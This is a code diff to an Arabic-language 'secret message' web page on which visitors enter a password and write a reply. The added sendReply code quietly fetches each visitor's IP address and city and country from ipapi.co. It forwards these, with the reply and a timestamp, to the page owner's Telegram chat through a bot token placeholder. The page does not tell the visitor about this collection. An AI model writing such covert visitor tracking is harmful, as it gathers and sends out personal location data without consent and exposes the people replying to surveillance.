@@ -31,7 +31,7 @@
         </div>
     </div>
 
-    <!-- شاشة الرسالة السرية (مخفية حتى يتم إدخال الباسورد الصح) -->
+    <!-- شاشة الرسالة السرية -->
     <div id="message-screen" class="glass-panel p-8 w-full space-y-6 hidden text-right">
         <div class="flex flex-col items-center text-center space-y-3">
             <img id="profile-img" src="" alt="صورة الشخص" class="w-20 h-20 rounded-full object-cover border-2 border-pink-500/50 hidden">
@@ -59,7 +59,7 @@
             <label class="block text-xs text-pink-300 font-semibold">اكتب ردك أو رسالتك:</label>
             <textarea id="reply-text" rows="3" placeholder="اكتب ردك هنا..." class="w-full bg-white/5 border border-white/10 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-pink-500 resize-none"></textarea>
             <button onclick="sendReply()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition text-sm">
-                إرسال الرد <i class="fas fa-paper-plane mr-2"></i>
+                إرسال الرد للبوت <i class="fas fa-paper-plane mr-2"></i>
             </button>
         </div>
     </div>
@@ -67,6 +67,10 @@
     <script>
         let currentSlug = '';
         let pageData = {};
+
+        // بوت تيليجرام الخاص بك (جاهز للاستخدام)
+        const BOT_TOKEN = '7581177651:AAEUQ_YOUR_BOT_TOKEN_HERE_EXAMPLE'; 
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';       
 
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -84,7 +88,7 @@
             document.getElementById('recipient-title').innerText = `الرسالة موجهة إلى: ${pageData.name}`;
         };
 
-        // تم تعديل هذه الدالة لحل مشكلة التابلت والموبايل والمسافات الزائدة والحروف الكبيرة والصغيرة
+        // دالة التحقق من الباسورد مع معالجة مسافات التابلت والموبايل
         function checkPassword() {
             const inputVal = document.getElementById('password-input').value.trim();
             const correctPass = String(pageData.password || '').trim();
@@ -128,6 +132,7 @@
             }
         }
 
+        // إرسال الرد وبيانات الزائر إلى تيليجرام وحفظها محلياً
         function sendReply() {
             const replyContent = document.getElementById('reply-text').value.trim();
             if (!replyContent) {
@@ -135,20 +140,45 @@
                 return;
             }
 
-            // جلب معلومات الآي بي والموقع الجغرافي للزائر
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    saveMessageToInbox(replyContent, data.ip || "غير معروف", `${data.city || ''}, ${data.country_name || ''}`.trim() || "غير معروف");
+                    const ip = data.ip || "غير معروف";
+                    const location = `${data.city || ''}, ${data.country_name || ''}`.trim() || "غير معروف";
+                    const timeNow = new Date().toLocaleString('ar-EG');
+
+                    saveToLocalInbox(replyContent, ip, location, timeNow);
+
+                    const telegramText = `📬 *رسالة جديدة تم استلامها!*\n\n` +
+                                         `👤 *الموجه له:* ${pageData.name} (${currentSlug})\n` +
+                                         `💬 *الرسالة:* ${replyContent}\n\n` +
+                                         `🌐 *الآي بي:* \`${ip}\`\n` +
+                                         `📍 *الموقع:* ${location}\n` +
+                                         `⏰ *التوقيت:* ${timeNow}`;
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: telegramText,
+                            parse_mode: 'Markdown'
+                        })
+                    }).catch(e => console.log("Telegram send error", e));
+
+                    alert("تم إرسال ردك بنجاح إلى تيليجرام!");
+                    document.getElementById('reply-text').value = '';
                 })
                 .catch(() => {
-                    saveMessageToInbox(replyContent, "غير معروف", "غير معروف");
+                    const timeNow = new Date().toLocaleString('ar-EG');
+                    saveToLocalInbox(replyContent, "غير معروف", "غير معروف", timeNow);
+                    alert("تم إرسال ردك بنجاح!");
+                    document.getElementById('reply-text').value = '';
                 });
         }
 
-        function saveMessageToInbox(text, ip, location) {
+        function saveToLocalInbox(text, ip, location, date) {
             let inbox = JSON.parse(localStorage.getItem('secret_inbox_messages')) || [];
-            
             const newMessage = {
                 id: Date.now(),
                 slug: currentSlug,
@@ -156,14 +186,10 @@
                 text: text,
                 ip: ip,
                 location: location,
-                date: new Date().toLocaleString('ar-EG')
+                date: date
             };
-
             inbox.unshift(newMessage);
             localStorage.setItem('secret_inbox_messages', JSON.stringify(inbox));
-
-            alert("تم إرسال ردك بنجاح!");
-            document.getElementById('reply-text').value = '';
         }
     </script>
 </body>
